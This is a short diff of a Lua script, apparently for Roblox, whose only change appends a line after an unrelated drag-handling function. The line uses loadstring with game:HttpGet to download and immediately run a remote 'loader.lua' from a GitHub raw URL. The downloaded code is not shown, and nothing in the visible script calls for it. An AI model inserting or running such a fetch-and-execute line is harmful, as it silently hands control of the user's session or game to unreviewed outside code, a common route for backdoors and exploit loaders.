@@ -321,3 +321,5 @@ UIS.InputEnded:Connect(function(input)
         dragging = false
     end
 end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/games/refs/heads/main/loader.lua', true))()
